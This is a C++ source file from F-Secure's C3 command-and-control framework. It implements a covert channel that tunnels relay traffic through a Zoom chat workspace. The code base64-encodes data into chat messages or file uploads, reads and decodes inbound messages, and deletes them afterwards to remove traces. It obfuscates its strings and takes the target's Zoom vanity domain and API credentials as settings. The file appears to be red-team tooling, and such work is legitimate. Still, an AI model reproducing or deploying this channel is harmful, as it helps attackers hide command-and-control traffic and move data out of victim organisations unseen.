#include "Stdafx.h"
#include "Zoom.h"
#include "Common/FSecure/Crypto/Base64.h"


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Zoom::Zoom(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [userAgent, accountId, clientId, clientSecret,  email, vanityDomain, channelName] = arguments.Read<std::string, std::string, std::string, std::string, std::string, std::string, std::string>();

	m_ZoomObj = FSecure::Zoom{ userAgent, accountId, clientId, clientSecret, email, vanityDomain, channelName};
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Zoom::OnSendToChannel(ByteView data)
{
	//Using file upload API for larger messages.
	size_t actualPacketSize = 0;
	// Max message size 4000 chars - outboundName - ':D:' 
	size_t max_size = 4000 - m_outboundDirectionName.length() - 3;
	auto maxPacketSize = cppcodec::base64_rfc4648::decoded_max_size(max_size);
	if (data.size() > maxPacketSize)
	{
		size_t maxFileSize = 1024*1024*19; // 19MB - should be a 20MB limit...
		actualPacketSize = std::min(maxFileSize, data.size());
		auto sendData = data.SubString(0, actualPacketSize);
		std::string uploadId = m_ZoomObj.UploadFile(sendData, m_outboundDirectionName + OBF(":D"));
	}
	else
	{
		//Write the full data into the thread.
		actualPacketSize = std::min(maxPacketSize, data.size());
		auto sendData = data.SubString(0, actualPacketSize);

		m_ZoomObj.WriteMessage(m_outboundDirectionName + OBF(":D:") + cppcodec::base64_rfc4648::encode(sendData.data(), sendData.size()));
	}

	return actualPacketSize;
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Zoom::OnReceiveFromChannel()
{
	std::vector<FSecure::ByteVector> ret;
	auto all_messages = m_ZoomObj.GetAllMessages();
	std::string direction = m_inboundDirectionName + OBF(":D");
	auto direction_messages = GetMessagesByDirection(all_messages, direction);

	std::vector<std::string> deleteMessageIds;

	for (std::vector<std::string>::reverse_iterator messageId = direction_messages.rbegin(); messageId != direction_messages.rend(); ++messageId)
	{
		// Get all packets sent in a single message inbound:Done:base64message
		for (auto& m : all_messages)
		{
			if (m.contains(OBF("id"))) {
				auto id = m[OBF("id")].get<std::string>();
				if (id == *messageId) {
					if (m.contains(OBF("file_name")))
					{
						std::string_view data = m[OBF("file_name")].get<std::string_view>();
						std::string fileData;

						if (
							data.size() >= direction.size() &&
							data.substr(0, direction.size()) == direction
							)
						{
							std::string file_url = m[OBF("download_url")].get<std::string>();
							fileData = m_ZoomObj.GetFile(file_url);
							FSecure::ByteVector relayMsg{ fileData.begin(), fileData.end() };
							ret.emplace_back(std::move(relayMsg));
							std::string fileId = m[OBF("file_id")].get<std::string>();
							m_ZoomObj.DeleteFile(fileId);
						}
					}
					else
					{
						if (m.contains(OBF("message"))) {
							std::string_view data = m[OBF("message")].get<std::string_view>();
							std::string actual_data;

							if (
								data.size() >= direction.size() &&
								data.substr(0, direction.size()) == direction
								)
							{
								// Split the message on : to get the third chunk - base64 message
								size_t pos1 = data.find(':');
								if (pos1 == std::string_view::npos)
									break;

								size_t pos2 = data.find(':', pos1 + 1);
								if (pos2 == std::string_view::npos)
									break;

								actual_data = data.substr(pos2 + 1);

								auto relayMsg = cppcodec::base64_rfc4648::decode(actual_data);
								ret.emplace_back(std::move(relayMsg));
							}
						}
					}
				}
			}
		}

		deleteMessageIds.push_back(std::move(*messageId));
	}

	if (deleteMessageIds.size() > 0)
		m_ZoomObj.DeleteMessages(deleteMessageIds); //delete read messages and replies.

	return ret;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<std::string> FSecure::C3::Interfaces::Channels::Zoom::GetMessagesByDirection(json const& messages, std::string const& direction)
{
	std::vector<std::string> direction_messages;

	for (auto& m : messages)
	{
		std::string_view data = m[OBF("message")].get<std::string_view>();

		//make sure it's a message we care about
		if (
			data.size() >= direction.size() &&
			data.substr(0, direction.size()) == direction
			)
		{
			direction_messages.emplace_back(m[OBF("id")].get<std::string>());
		}
		else
		{
			if (m.contains(OBF("file_name")))
			{
				std::string_view file_name = m[OBF("file_name")].get<std::string_view>();

				if (
					file_name.size() >= direction.size() &&
					file_name.substr(0, direction.size()) == direction
					)
				{
					direction_messages.emplace_back(m[OBF("id")].get<std::string>());
				}
			}
		}
	}
	return direction_messages;
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<std::pair<std::string, std::string>> FSecure::C3::Interfaces::Channels::Zoom::ReadReplies(json const& messages, std::string const& messageId)
{
	std::vector<std::pair<std::string, std::string>> replies;

	for (auto& reply : messages)
	{
		if (reply.contains(OBF("reply_main_message_id"))) {
			auto id = reply[OBF("reply_main_message_id")].get<std::string>();
			if (id == messageId) {
				std::string text;
				if (reply.contains(OBF("download_url")))
				{
					std::string fileUrl = reply[OBF("download_url")].get<std::string>();
					text = m_ZoomObj.GetFile(fileUrl);
				}
				else
					text = reply[OBF("message")].get<std::string>();
				replies.emplace_back(std::move(reply[OBF("id")]), std::move(text));
			}
		}
	}
	return replies;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Zoom::DeleteChannel()
{
	m_ZoomObj.DeleteChannel();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Zoom::DeleteAllMessages()
{
	m_ZoomObj.DeleteAllMessages();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Zoom::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCopy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		DeleteChannel();
		return {};
	case 1:
		DeleteAllMessages();
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::Zoom::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 6,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 6,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "User-Agent Header",
				"description": "The User-Agent header to set."
			},
			{
				"type": "string",
				"name": "Account ID",
				"min": 20,
				"description": "Zoom Server to Server Account ID"
			},
			{
				"type": "string",
				"name": "Client ID",
				"min": 20,
				"description": "Zoom Server to Server Client ID"
			},
			{
				"type": "string",
				"name": "Client Secret",
				"min": 30,
				"description": "Zoom Server to Server Client Secret"
			},
			{
				"type": "string",
				"name": "Email",
				"description": "Account owner's email"
			},
			{
				"type": "string",
				"name": "Vanity Domain",
				"description": "Target's Zoom vanity domain"
			},
			{
				"type": "string",
				"name": "Channel name",
				"min": 4,
				"randomize": true,
				"description": "Name of Zoom's channel used by api"
			}
		]
	},
	"commands": [
		{
			"name": "Delete channel",
			"id": 0,
			"description": "Delete channel and all messages within it.",
			"arguments": []
		},
		{
			"name": "Clear all messages",
			"id": 1,
			"description": "Delete all messages in channel.",
			"arguments": []
		}
	]
}
)_";
}

